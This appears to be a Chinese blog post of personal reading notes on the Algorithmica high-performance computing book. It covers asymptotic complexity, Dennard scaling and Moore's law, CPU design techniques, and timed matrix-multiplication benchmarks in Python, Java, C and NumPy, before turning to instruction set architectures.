<p>假设某程序的指令总延迟为 100,000 个时钟周期，而 CPU 的时钟频率是 2 GHz（即每秒 20 亿个周期），那么程序的实际运行时间可以通过以下公式计算：</p>
<p>$运行时间= \frac{\text{延迟周期数}}{\text{时钟频率}} = \frac{100,000}{2 \times 10^9} \text{秒} = 0.00005 \text{秒}$</p>
<p>通过这种方式，可以估算程序的实际运行时间，考虑到不同指令的执行延迟和CPU的时钟频率。</p>
<h5 id="渐进分析理论"><a href="#渐进分析理论" class="headerlink" title="渐进分析理论"></a>渐进分析理论</h5><p>在计算机发展的初期，计算机科学家需要密切关注程序的执行时间、所用的处理周期（即基本的计算单元）以及涉及的操作次数。这些详细的度量在当时非常重要，因为计算资源有限，性能优化对程序的运行有显著的影响。</p>
<p>随着计算机性能的提升，系统变得更强大，详细的执行时间、周期和操作数的度量变得不那么关键。计算机科学家转而更加关注渐近分析（Asymptotic Analysis），这种分析方法提供了一个抽象的视角，用来描述算法在输入规模增大时的性能变化。</p>
<ul>
<li>例如，计算机科学家不再一一跟踪每一个操作和周期，而是使用“大 O”符号来描述一个算法随着输入规模增长的运行时间表现。这种方法让你可以忽略常数因素和较低阶的项，专注于算法如何随着输入的增大而扩展。</li>
</ul>
<p>使用渐近复杂度（例如 Big O、Big Theta 和 Big Omega）使得研究人员和工程师可以专注于算法效率的“整体情况”。这种方法抹去了硬件性能和初始操作成本的细节，让人们能够更加容易地比较不同算法，而不需要考虑具体实现或硬件差异的影响。</p>
<p>Big O、Big Theta 和 Big Omega 是用于描述算法时间复杂度的渐近符号，它们分别表示不同方面的性能分析。它们的主要区别在于描述算法的上界、下界和精确度。以下是对这三者的详细解释：</p>
<ol>
<li><strong>Big O (大 O)</strong></li>
</ol>
<ul>
<li><strong>定义</strong>：Big O 符号用于表示算法的 <strong>上界</strong>，即算法的 <strong>最坏情况</strong> 时间复杂度。</li>
<li><strong>含义</strong>：Big O 描述的是随着输入规模增大，算法的运行时间增长的速度。它给出了一个上限，说明在最坏情况下，算法的执行时间不会超过某个特定的增长速率。</li>
<li><strong>表示法</strong>：如果某个算法的时间复杂度是 O(f(n))，意味着对于足够大的输入 n，算法的时间复杂度最多是 f(n) 的一个常数倍，忽略常数因素。</li>
<li><strong>例子</strong>：假设算法的时间复杂度为 <code>O(n^2)</code>，这意味着随着输入规模 n 增加，算法的运行时间最多增长到与 n^2 成正比。</li>
</ul>
<p>$T(n) \leq C \cdot f(n) \quad \text{(对于足够大的 n)}$</p>
<p>其中，C 是常数，n 是输入规模。</p>
<ol>
<li><strong>Big Theta (大 Θ)</strong></li>
</ol>
<ul>
<li><strong>定义</strong>：Big Theta 符号用于表示算法的 <strong>精确</strong> 时间复杂度，或者说它给出了一个算法时间复杂度的 <strong>上下界</strong>。</li>
<li><strong>含义</strong>：Big Theta 描述的是算法的时间复杂度的 <strong>渐近精确界限</strong>，即算法的执行时间随着输入规模增大时，会以 f(n) 作为界限的上下界增长。</li>
<li><strong>表示法</strong>：如果某个算法的时间复杂度是 Θ(f(n))，意味着该算法在最坏和最好情况下的时间复杂度都与 f(n) 成正比，并且在足够大的输入规模下，算法的时间复杂度将在 f(n) 的一个常数范围内波动。</li>
<li><strong>例子</strong>：如果某个算法的时间复杂度是 <code>Θ(n log n)</code>，这意味着无论最坏情况还是最好情况，它的时间复杂度都是与 n log n 成正比的。</li>
</ul>
<p>$C_1 \cdot f(n) \leq T(n) \leq C_2 \cdot f(n) \quad \text{(对于足够大的 n)}$</p>
<p>其中，C₁ 和 C₂ 是常数，n 是输入规模。</p>
<ol>
<li><strong>Big Omega (大 Ω)</strong></li>
</ol>
<ul>
<li><strong>定义</strong>：Big Omega 符号用于表示算法的 <strong>下界</strong>，即算法的 <strong>最好情况</strong> 时间复杂度。</li>
<li><strong>含义</strong>：Big Omega 描述的是在最好的情况下，算法的时间复杂度的最小增长速率。它给出了一个算法执行所需时间的下限，表示即使在最理想的情况下，算法的执行时间也不会低于某个特定的增长速率。</li>
<li><strong>表示法</strong>：如果某个算法的时间复杂度是 Ω(f(n))，意味着对于足够大的输入规模 n，算法的时间复杂度至少会增长到与 f(n) 成正比的某个常数倍。</li>
<li><strong>例子</strong>：如果某个算法的时间复杂度是 <code>Ω(n)</code>，这意味着在最佳情况下，算法的运行时间至少与 n 成正比。</li>
</ul>
<p>$T(n) \geq C \cdot f(n) \quad \text{(对于足够大的 n)}$</p>
<p>其中，C 是常数，n 是输入规模。</p>
<p>总结来说，从精确计算操作数到使用渐近复杂度分析的转变，是计算机硬件性能提高的结果，表明对于大规模输入来说，算法的扩展行为比具体的时间或操作数更为重要。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/complexity.jpg"
                      class=""
                >
<blockquote>
<p>Under the promise that computers will eventually become fast enough to handle any <em>sufficiently large</em> input in a reasonable amount of time, asymptotically faster algorithms will always be faster in real-time too, regardless of the hidden constant.</p>
<p>But this promise turned out to be not true — at least not in terms of clock speeds and instruction latencies — and in this chapter, we will try to explain why and how to deal with it.</p>
</blockquote>
<p>这里存在一个假设，就是在渐进分析上更快的算法会在实际运行时间上也会更快。但这个假设实际上是错误的，之后具体的篇章讲述了详细的原因以及处理方式。</p>
<h4 id="现代硬件"><a href="#现代硬件" class="headerlink" title="现代硬件"></a>现代硬件</h4><p>芯片的出现极大降低了电脑的成本，是一个革命性的发明。微芯片的制造过程，主要是通过<strong>光刻（photolithography）</strong>技术在晶体硅片上“打印”电路。</p>
<p>根据Dennard Scaling理论，当晶体管尺寸缩小约30%时，会发生以下变化：</p>
<ul>
<li><strong>晶体管密度翻倍</strong>：晶体管数量增加，能在相同面积内放置更多的晶体管。因为 $0.7^2≈0.5$</li>
<li><strong>时钟速度增加40%</strong>：由于晶体管变小，其开关速度加快，时钟频率能够提高。因为 $\frac{1}{0.7}≈1.4$</li>
<li><strong>功率密度保持不变</strong>：虽然晶体管数量增加，但由于每个晶体管功耗减少，总体功耗密度（单位面积的功耗）保持相对不变。</li>
</ul>
<p>Gordon Moore在1975年就做出了预测，晶体管上微处理器的数量每两年就会翻一番。这就是我们熟知的摩尔定律。</p>
<p>上述两个理论都不是物理定律，它们都是专家的观测结果，在某种程度上一定会受到基础物理的制约。</p>
<blockquote>
<p>Thermodynamically, a computer is just a very efficient device for converting electrical power into heat. This heat eventually needs to be removed, and there are physical limits to how much power you can dissipate from a millimeter-scale crystal. Computer engineers, aiming to maximize performance, essentially just choose the maximum possible clock rate so that the overall power consumption stays the same. If transistors become smaller, they have less capacitance, meaning less required voltage to flip them, which in turn allows increasing the clock rate.</p>
</blockquote>
<p><strong>计算机的热力学本质</strong>：</p>
<ul>
<li>从热力学的角度来看，计算机实际上就是一种非常高效的设备，将电能转化为热能。</li>
<li>计算机在运行过程中会消耗电能并生成热量，随着功耗的增加，热量也会增加。因此，必须通过适当的散热机制将热量排除，否则过多的热量会影响计算机的稳定性和性能。</li>
</ul>
<p><strong>功耗与散热的物理限制</strong>：</p>
<ul>
<li><strong>物理限制</strong>：计算机的功耗有一定的物理限制，特别是在微米尺度的晶体管上。随着晶体管的尺寸变小，每个晶体管产生的热量会增加，而散热能力是有限的。因此，需要有效的散热设计来避免温度过高，导致计算机性能下降或硬件损坏。</li>
</ul>
<p><strong>计算机工程师的设计目标</strong>：</p>
<ul>
<li>在设计中，工程师们通常会选择<strong>最大可能的时钟频率</strong>，以保证在给定的功耗限制内，计算机能够提供尽可能高的性能。时钟频率越高，芯片每秒钟能够执行的操作就越多，从而提高计算能力。</li>
</ul>
<p><strong>晶体管尺寸对性能的影响</strong>：</p>
<ul>
<li>当晶体管变得更小时，<strong>电容变小</strong>，这意味着晶体管的开关所需的电压变低。因此，电压要求降低，进而可以提高时钟频率。更高的时钟频率意味着芯片能够在单位时间内处理更多的任务，从而提升计算性能。</li>
</ul>
<p>但2005年到2007年间，随着晶体管尺寸进一步缩小，<strong>漏电效应（leakage effects）</strong>导致了微芯片设计面临的一个新的问题，使得之前依赖于缩小晶体管来提升性能的策略不再有效。</p>
<p><strong>漏电效应（Leakage Effects）</strong>：</p>
<ul>
<li><strong>晶体管尺寸过小</strong>：随着微芯片中的晶体管变得越来越小，电路的特征尺寸接近于纳米级别。这使得晶体管和周围电路之间的相互作用变得复杂，导致出现了<strong>漏电效应</strong>。</li>
<li><strong>磁场干扰</strong>：当晶体管的尺寸足够小，晶体管产生的电磁场开始影响到相邻电路中的电子运动。电场和磁场的干扰可能会导致电子朝着不该去的方向运动，进而引发<strong>不必要的加热</strong>和<strong>比特翻转</strong>（bit flipping）。</li>
</ul>
<p><strong>不必要的加热</strong>：</p>
<ul>
<li>晶体管本应按照设计工作，但由于电流的误导，电子可能在错误的路径上流动，造成额外的<strong>热量产生</strong>。这不仅增加了能量消耗，还使得芯片的散热负担增加，进而影响芯片的稳定性。</li>
</ul>
<p><strong>比特翻转（Bit Flipping）</strong>：</p>
<ul>
<li>由于电流干扰和漏电效应，某些电子可能会被错误地推动到其他状态，这会导致<strong>比特翻转</strong>。比特翻转指的是存储的数据位发生错误，从而可能导致计算错误或系统故障。</li>
</ul>
<p>一种应对漏电效应的有效方法是增加电压，但是增加电压会导致功耗增加以及时钟频率降低。这样一来微型化的优势就开始减弱了。</p>
<blockquote>
<p>Here are some core approaches making use of more available transistors that are driving recent computer designs:</p>
<ul>
<li>Overlapping the execution of instructions so that different parts of the CPU are kept busy (pipelining);</li>
<li>Executing operations without necessarily waiting for the previous ones to complete (speculative and out-of-order execution);</li>
<li>Adding multiple execution units to process independent operations simultaneously (superscalar processors);</li>
<li>Increasing the machine word size, to the point of adding instructions capable of executing the same operation on a block of 128, 256, or 512 bits of data split into groups (<a class="link"   href="https://en.algorithmica.org/hpc/simd/" >SIMD<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>);</li>
<li>Adding <a class="link"   href="https://en.algorithmica.org/hpc/cpu-cache/" >layers of cache<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> on the chip to speed up <a class="link"   href="https://en.algorithmica.org/hpc/external-memory/" >RAM and external memory<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> access time (memory doesn’t quite follow the laws of silicon scaling);</li>
<li>Adding multiple identical cores on a chip (parallel computing, GPUs);</li>
<li>Using multiple chips in a motherboard and multiple cheaper computers in a data center (distributed computing);</li>
<li>Using custom hardware to solve a specific problem with better chip utilization (ASICs, FPGAs).</li>
</ul>
</blockquote>
<p>以上列出了几种核心的计算机设计方法，利用更多可用的晶体管来推动近期计算机设计的进展。</p>
<ol>
<li><strong>流水线技术（Pipelining）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：流水线技术将指令的执行分为多个阶段，使得每个阶段可以同时处理不同的指令。这样可以减少等待时间并提高执行效率。</li>
<li><strong>优势</strong>：通过重叠执行不同指令的不同部分，CPU的各个部分保持工作状态，提升了指令执行的并行度。</li>
</ul>
<ol>
<li><strong>猜测执行和乱序执行（Speculative and Out-of-Order Execution）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：在某些指令尚未完成时，处理器会提前执行一些推测的操作，或者不必等待前一条指令完成后才执行下一条指令。</li>
<li><strong>优势</strong>：提高了执行效率，减少了等待时间，尤其是在指令之间没有强依赖关系时。</li>
</ul>
<ol>
<li><strong>超标量处理器（Superscalar Processors）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：通过在处理器中添加多个执行单元，允许同时处理多个独立的操作。</li>
<li><strong>优势</strong>：可以在每个时钟周期内并行执行多个指令，提升了计算能力。</li>
</ul>
<ol>
<li><strong>SIMD（Single Instruction, Multiple Data）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：增加机器字长，使得处理器能够对128位、256位或512位的数据块进行操作，并对这些数据分组处理。</li>
<li><strong>优势</strong>：在进行数据处理时，同一指令可以同时操作多个数据，极大提高了处理能力，特别是在大规模数据并行处理（如图像和视频处理）时非常有效。</li>
</ul>
<ol>
<li><strong>多级缓存（Multiple Layers of Cache）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：在芯片上添加多个层级的缓存，以加速RAM和外部内存的访问速度。</li>
<li><strong>优势</strong>：由于内存访问速度相对较慢，通过高速缓存可以显著减少CPU与内存之间的访问延迟，提升整体性能。</li>
</ul>
<ol>
<li><strong>多核处理（Parallel Computing, GPUs）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：在芯片上添加多个相同的核心，允许同时处理多个任务或线程，适用于并行计算任务。</li>
<li><strong>优势</strong>：可以显著提升多任务处理能力，尤其适用于GPU计算（如图形渲染、深度学习等并行任务）。</li>
</ul>
<ol>
<li><strong>分布式计算（Distributed Computing）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：使用多个芯片在主板上，或者在数据中心中使用多个便宜的计算机进行分布式计算。</li>
<li><strong>优势</strong>：通过将任务分配到多个计算节点，可以有效扩展计算能力，尤其适用于大规模数据处理和高性能计算。</li>
</ul>
<ol>
<li><strong>定制硬件（ASICs, FPGAs）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：使用定制的硬件（如ASIC和FPGA）来解决特定问题，以便在特定任务中获得更好的芯片利用率和性能。</li>
<li><strong>优势</strong>：通过硬件的专门设计，可以为特定应用提供更高的性能和更低的功耗，广泛应用于加速特定计算任务，如加密算法、图像处理等。</li>
</ul>
<p>对于现代计算机来说，传统的“计算所有操作”来预测算法性能的方法不仅仅是有一点偏差，而是误差可能达到几个数量级。这表明我们需要采用新的计算模型和其他方式来评估算法的性能。</p>
<h4 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h4><blockquote>
<p>The real answer, of course, is much more complicated and highly dependent on what kind of “operation” you have in mind. It can be as low as 10^7 for things like <a class="link"   href="https://en.algorithmica.org/hpc/cpu-cache/latency" >pointer chasing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> and as high as 10^11 for <a class="link"   href="https://en.algorithmica.org/hpc/simd" >SIMD-accelerated<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> linear algebra.</p>
</blockquote>
<p>这个对比旨在强调，在不同的硬件和操作类型下，算法的表现可能会有巨大的差异，单纯计算操作次数并不足以准确预测实际性能。在这里，<strong>更多的操作次数（10^11）</strong> 并不一定意味着更花时间，反而通过现代的硬件加速技术（如 SIMD），高效的并行计算能在短时间内处理更多操作。</p>
<blockquote>
<p>so one of the first things people did after creating computers was create <em>programming languages</em>, which abstract away some details of how computers operate to simplify the process of programming.</p>
</blockquote>
<p>人们在创造了计算机后第一件事就是创建编程语言，因为这能隐藏执行细节并简化编程过程。而编程语言具有不同的类型。</p>
<p>从程序员的角度来看：</p>
<ol>
<li><strong>编译型语言</strong>（Compiled Languages）：<br>这类语言在执行之前会经过一个预处理阶段（编译），即把源代码转换为机器代码，然后直接执行。比如 C、Go、Rust 等语言。编译型语言通常执行效率较高，因为它们的代码已经完全被转换成了 CPU 可以直接理解的机器代码。</li>
<li><strong>解释型语言</strong>（Interpreted Languages）：<br>解释型语言的执行是在运行时进行的，程序并不会提前转换为机器代码，而是通过一个叫做<strong>解释器</strong>的程序逐行执行源代码。典型的解释型语言有 Python、JavaScript 和 Ruby。这类语言的优点是方便调试和动态执行，但通常速度较慢，因为每一行代码都需要实时解释执行。</li>
</ol>
<p>从计算机的角度来看：</p>
<ol>
<li><strong>原生语言</strong>（Native Languages）：<br>原生语言直接生成机器代码，能够直接在 CPU 上执行，运行时不依赖其他中间层。像 C、Go 和 Rust 这样的编译型语言就属于原生语言，因为它们直接生成可以被操作系统和 CPU 执行的机器码。</li>
<li><strong>托管语言</strong>（Managed Languages）：<br>托管语言依赖某种运行时（runtime）来进行执行。运行时负责管理内存、执行代码等操作。Java、C# 和 Erlang 就是典型的托管语言，它们在执行之前会被编译成一种中间代码，然后由虚拟机（VM）来执行。比如 Java 代码会先被编译为字节码（bytecode），然后由 JVM 运行。</li>
</ol>
<p>根据上述的分类方式，编程语言可以分为三大类：</p>
<ol>
<li><strong>解释型语言</strong>（Interpreted Languages）：比如 Python、JavaScript、Ruby 等。直接在运行时由解释器执行代码。</li>
<li><strong>带有运行时的编译语言</strong>（Compiled Languages with a Runtime）：如 Java、C#、Erlang 等。源代码首先被编译为中间代码（比如字节码），然后由虚拟机或运行时执行。</li>
<li><strong>编译后的原生语言</strong>（Compiled Native Languages）：如 C、Go、Rust 等。直接编译成机器代码，可以直接在 CPU 上运行。</li>
</ol>
<p>为了直观感受这三类语言效率上的差距，我们可以以1024*1024规模的矩阵相乘来测试一下执行效率：</p>
<p>解释型语言（以python为例）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">a = [[random.random()</span><br><span class="line">      <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">      <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line">b = [[random.random()</span><br><span class="line">      <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">      <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line">c = [[<span class="number">0</span></span><br><span class="line">      <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">      <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            c[i][j] += a[i][k] * b[k][j]</span><br><span class="line"></span><br><span class="line">duration = time.time() - start</span><br><span class="line"><span class="built_in">print</span>(duration)</span><br></pre></td></tr></table></figure></div>
<p>我自己跑出来的结果大约是181秒左右。然后我们仔细看看发生了什么。</p>
<ul>
<li>首先解释器开始解析<code>c[i][j] += a[i][k] * b[k][j]</code> 这一个语句，然后去找a，b，c是什么类型。</li>
<li>找到a是一个列表，然后提取出[]的操作符，解析出a[i]，这仍然是一个列表，于是继续解析<code>a[i][k]</code>，这是一个float类型的数</li>
<li>之后取出并执行<code>*</code>操作</li>
<li>对b和c进行同样的解析，最终把结果存在<code>c[i][j]</code></li>
</ul>
<p>然后我们来看看<strong>托管语言</strong>（Managed Languages），以java为例</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Matmul.java</span></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Matmul</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span>[][] a = <span class="keyword">new</span> <span class="title class_">double</span>[n][n];</span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span>[][] b = <span class="keyword">new</span> <span class="title class_">double</span>[n][n];</span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span>[][] c = <span class="keyword">new</span> <span class="title class_">double</span>[n][n];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">rand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                a[i][j] = rand.nextDouble();</span><br><span class="line">                b[i][j] = rand.nextDouble();</span><br><span class="line">                c[i][j] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">                    c[i][j] += a[i][k] * b[k][j];</span><br><span class="line">                </span><br><span class="line">        <span class="type">double</span> <span class="variable">diff</span> <span class="operator">=</span> (System.nanoTime() - start) * <span class="number">1e-9</span>;</span><br><span class="line">        System.out.println(diff);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">javac Matmul.java</span><br><span class="line">java Matmul</span><br></pre></td></tr></table></figure></div>
<p>这仅仅用了2.4秒就完成了。</p>
<p>java 程序首先会被编译成 <strong>字节码</strong>，即 <code>.class</code> 文件。这些字节码不是针对某一特定硬件架构的机器码，而是跨平台的。字节码可以在任何支持 JVM 的平台上运行。字节码在 <strong>JVM</strong>（Java Virtual Machine）中解释执行。<strong>JVM</strong> 是一个运行 Java 程序的虚拟机，它将字节码转换为适合当前硬件的<strong>机器指令</strong>。由于字节码不是直接的机器码，所以 JVM 执行过程会有一定的性能开销。</p>
<p>python也有类似于JVM的技术，称为<strong>PyPy</strong>。</p>
<p>然后最后我们看看编译型语言，如C。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> n 1024</span></span><br><span class="line"><span class="type">double</span> a[n][n], b[n][n], c[n][n];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            a[i][j] = (<span class="type">double</span>) rand() / RAND_MAX;</span><br><span class="line">            b[i][j] = (<span class="type">double</span>) rand() / RAND_MAX;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">clock_t</span> start = clock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">                c[i][j] += a[i][k] * b[k][j];</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> seconds = (<span class="type">float</span>) (clock() - start) / CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.4f\n&quot;</span>, seconds);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -O3 -g test.c -o <span class="built_in">test</span>	<span class="comment">#我们开O3优化进行编译</span></span><br><span class="line">./poc</span><br></pre></td></tr></table></figure></div>
<p>只用了1.3秒就得到了结果。如果我们换为<code>gcc -O3 -march=native -ffast-math -g poc.c -o poc</code>，甚至可以在0.15秒左右的时间内得到结果。</p>
<p><code>-march=native</code> 标志告诉编译器将代码优化为运行在当前编译机器的CPU架构上。这意味着编译器会针对当前处理器的指令集和特定功能进行优化，利用特定的硬件指令来提升性能。</p>
<p>例如，现代CPU支持高级向量化指令（如 AVX、SSE），可以一次性处理多个数据元素，从而加速计算。使用 <code>-march=native</code> 标志后，编译器会利用这些指令，从而大幅提升性能。</p>
<p><code>-ffast-math</code> 标志允许编译器进行激进的浮点优化，例如放宽浮点数的舍入和精度要求。虽然这可能会引入一些不精确的计算，但也可以显著加速数学运算，使得编译器能够使用更快的（但精度较低的）浮点计算。</p>
<p>编译器还可以重新安排浮点操作，以避免一些昂贵的操作，或者利用硬件特定指令，例如用于并行操作的向量化指令。</p>
<p>我们现在回到python，但是使用 <a class="link"   href="https://www.openblas.net/" >OpenBLAS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>来进行计算：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">n = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">a = np.random.rand(n, n)</span><br><span class="line">b = np.random.rand(n, n)</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line">c = np.dot(a, b)</span><br><span class="line"></span><br><span class="line">duration = time.time() - start</span><br><span class="line"><span class="built_in">print</span>(duration)</span><br></pre></td></tr></table></figure></div>
<p>所用时间来到了惊人的0.02秒。<strong>OpenBLAS</strong> 是一个广泛使用的高效线性代数库，通常用于实现像矩阵乘法这样的操作。为了实现优化，OpenBLAS中关于稠密矩阵乘法的实现通常涉及大量手写的汇编代码，每种架构的代码都需要根据其硬件特性单独定制。这些实现可能有多达 <strong>5000行汇编代码</strong>，针对不同的硬件架构进行了深度优化，以充分利用其特性（如SIMD指令集、缓存优化等）。后续的内容将逐步解释如何利用一些优化技术来提升矩阵乘法的性能。最终的目标是开发出一种简化的矩阵乘法实现，仅需 <strong>不到40行C代码</strong>，并能够在性能上接近OpenBLAS的实现。</p>
<h3 id="二、计算机架构"><a href="#二、计算机架构" class="headerlink" title="二、计算机架构"></a>二、计算机架构</h3><h4 id="指令集架构（ISA）"><a href="#指令集架构（ISA）" class="headerlink" title="指令集架构（ISA）"></a>指令集架构（ISA）</h4><blockquote>
<p>Hardware engineers love abstractions too. An abstraction of a CPU is called an <em>instruction set architecture</em> (ISA), and it defines how a computer should work from a programmer’s perspective. Similar to software interfaces, it gives computer engineers the ability to improve on existing CPU designs while also giving its users — us, programmers — the confidence that things that worked before won’t break on newer chips.</p>
</blockquote>
<p>指令集架构（ISA）就像软件中的接口一样，规定了硬件需要支持的指令和功能。硬件工程师根据这个架构设计和实现具体的CPU，确保每个指令能够正确执行，而程序员则通过这些指令集来编写代码，而不需要关心底层硬件的具体实现细节。假设我们使用的是基于 <strong>x86</strong> 架构的 CPU。这个架构定义了一些基本的指令，如 <strong>MOV</strong>（移动数据）、<strong>ADD</strong>（加法）、<strong>JMP</strong>（跳转）等。无论你用什么样的 <strong>x86</strong> 处理器，这些指令的语义和功能始终保持一致。</p>
<p>指令集不同于字符编码集或即时通讯协议一样，能够低成本地在一台机器上完整的分别支持每一个不同的集合。一般机器会支持arm(RISC)或者x86(CISC)架构其中之一。</p>
<p>ARM架构被广泛应用于几乎所有的移动设备，如智能手机、平板电脑等。此外，还应用于一些智能设备和计算设备，包括电视、智能冰箱、微波炉、汽车自动驾驶系统等。因为ARM架构的处理器通常采用低功耗设计，适合移动设备和嵌入式设备使用。</p>
<p>x86架构几乎被所有的服务器和桌面计算机广泛使用。几乎所有的传统个人电脑（PC）和工作站都采用x86架构处理器。x86处理器通常提供更强大的性能，适合高性能计算需求，如桌面电脑、服务器等。相比于ARM处理器，x86处理器的功耗较高，但它们提供了更强的计算能力，因此适用于需要大量计算资源的应用场景。</p>
<h4 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h4><blockquote>
<p>Assembly is very simple in the sense that it doesn’t have many syntactical constructions compared to high-level programming languages. </p>
</blockquote>
<p>相较于高级语言具有很多的语法结构，汇编语言相当简单。主要就是涉及到数据的读取，操作与存储以及指令的跳转。汇编十分接近机器码，我们能够方便的对机器码进行反汇编。</p>
<p>以下是<em>c = </em>a + *b这个功能实现的两种架构汇编实现示例：</p>
